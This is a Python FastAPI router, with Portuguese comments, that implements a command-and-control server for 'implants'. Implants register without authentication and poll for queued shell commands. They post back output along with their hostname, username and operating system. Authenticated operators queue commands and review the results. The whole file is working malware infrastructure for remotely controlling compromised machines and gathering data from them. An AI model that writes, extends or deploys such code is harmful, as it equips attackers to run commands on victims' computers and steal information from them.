import datetime
from fastapi import APIRouter, HTTPException, status
from ...models.implant import Implant
from ...schemas.implant import ImplantCreate, ImplantRead, Msg, CommandResponse
from ..dependencies import SessionDep, CurrentOperatorDep

router = APIRouter()

# listar todos os implants (Operator) GET
@router.get('/', response_model=list[ImplantRead])
async def list_all_implants(
    db: SessionDep,
    current_operator: CurrentOperatorDep
):
    implants = db.query(Implant).all()
    return implants


# Deletar um implant (Operator) DELETE
@router.delete("/{implant_token}", response_model=Msg)
async def delete_implant(
    implant_token: str, 
    db: SessionDep,
    current_operator: CurrentOperatorDep
):
    db_implant = db.query(Implant).filter(Implant.token == implant_token).first()
    if not db_implant:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Implant not found"
        )
    db.delete(db_implant)
    db.commit()
    return Msg(msg="Implant deleted successfully")

# -------------------------------------------------------------------

# Cria um novo implant (Agent) POST
@router.post("/", response_model=Msg)
def create_implant(
    implant: ImplantCreate, 
    db: SessionDep
):
    try:
        vtoken = db.query(Implant).filter(Implant.token == implant.token).first()
        if vtoken:
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="Implant with this token already exists"
            )

        # Verifica se o token já existe
        db_implant = Implant(
            **implant.model_dump(),
            is_alive=True  
        )
        db.add(db_implant)
        db.commit()
        db.refresh(db_implant)

        return Msg(msg="Implant created successfully")
    except Exception as e:
        return Msg(msg=f"Error {str(e)}")


# Ping de um implant (Agent) GET
@router.get("/ping/{implant_token}", response_model=CommandResponse)
async def ping_implant(
    implant_token: str, 
    db: SessionDep  
):
    db_implant = db.query(Implant).filter(Implant.token == implant_token).first()
    if not db_implant:
        raise HTTPException(
            status_code=status.HTTP_410_GONE,  # 410 Gone - indica que o recurso foi removido permanentemente
            detail="Implant has been removed from the server"
        )
    db_implant.is_alive = True
    db_implant.last_seen = datetime.datetime.utcnow()
    db.commit()
    db.refresh(db_implant)
    
    # Se há um comando pendente para execução
    if db_implant.is_command_control and db_implant.command:
        command_to_execute = db_implant.command
        # Guarda o comando que está sendo enviado
        db_implant.last_command_sent = command_to_execute
        # Limpa o comando pendente após enviá-lo
        db_implant.command = None
        db_implant.is_command_control = False
        db.commit()
        return CommandResponse(msg="Pong!", cmd=command_to_execute)

    # Sem comando pendente - só retorna mensagem normal
    return CommandResponse(msg="Pong!")
    
@router.post("/command/{implant_token}", response_model=Msg)
async def send_command_to_implant(
    implant_token: str, 
    command: str, 
    db: SessionDep,
    current_operator: CurrentOperatorDep
):
    db_implant = db.query(Implant).filter(Implant.token == implant_token).first()
    if not db_implant:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Implant not found"
        )
    
    # Define o comando e marca que há comando pendente
    db_implant.command = command
    db_implant.is_command_control = True
    db.commit()
    db.refresh(db_implant)

    return Msg(msg="Command sent successfully")

# Endpoint para receber resultado de comandos executados (Agent) POST
@router.post("/result/{implant_token}", response_model=Msg)
async def receive_command_result(
    implant_token: str,
    result_data: dict,
    db: SessionDep
):
    db_implant = db.query(Implant).filter(Implant.token == implant_token).first()
    if not db_implant:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Implant not found"
        )
    
    # Armazena o resultado do comando no banco de dados
    command_output = result_data.get('output', 'No output')
    
    # Usa o comando enviado do resultado, ou o último comando enviado como fallback
    executed_command = result_data.get('command', db_implant.last_command_sent or 'Unknown command')
    
    # Atualiza o implant com o último resultado
    db_implant.last_command_executed = executed_command
    db_implant.last_command_output = command_output
    db_implant.last_command_timestamp = datetime.datetime.utcnow()
    
    db.commit()
    db.refresh(db_implant)
    
    # Log do resultado do comando
    print(f"[+] Command result from {implant_token}:")
    print(f"    Command: {executed_command}")
    print(f"    Message: {result_data.get('msg', 'No message')}")
    print(f"    Output: {command_output}")
    
    return Msg(msg="Result received successfully")

# Endpoint para visualizar resultado do último comando executado (Operator) GET
@router.get("/result/{implant_token}", response_model=dict)
async def get_command_result(
    implant_token: str,
    db: SessionDep,
    current_operator: CurrentOperatorDep
):
    db_implant = db.query(Implant).filter(Implant.token == implant_token).first()
    if not db_implant:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Implant not found"
        )
    
    result = {
        "implant_token": implant_token,
        "hostname": db_implant.hostname,
        "username": db_implant.username,
        "last_command_sent": db_implant.last_command_sent,
        "last_command_executed": db_implant.last_command_executed,
        "command_output": db_implant.last_command_output,
        "execution_time": db_implant.last_command_timestamp.isoformat() if db_implant.last_command_timestamp else None,
        "is_alive": db_implant.is_alive,
        "last_seen": db_implant.last_seen.isoformat()
    }
    
    return result

# Endpoint para listar todos os implants com seus últimos resultados (Operator) GET
@router.get("/results/all", response_model=list[dict])
async def get_all_command_results(
    db: SessionDep,
    current_operator: CurrentOperatorDep
):
    implants = db.query(Implant).all()
    
    results = []
    for implant in implants:
        result = {
            "implant_token": implant.token,
            "hostname": implant.hostname,
            "username": implant.username,
            "operating_system": implant.operating_system,
            "last_command_sent": implant.last_command_sent,
            "last_command_executed": implant.last_command_executed,
            "command_output": implant.last_command_output,
            "execution_time": implant.last_command_timestamp.isoformat() if implant.last_command_timestamp else None,
            "is_alive": implant.is_alive,
            "last_seen": implant.last_seen.isoformat()
        }
        results.append(result)
    
    return results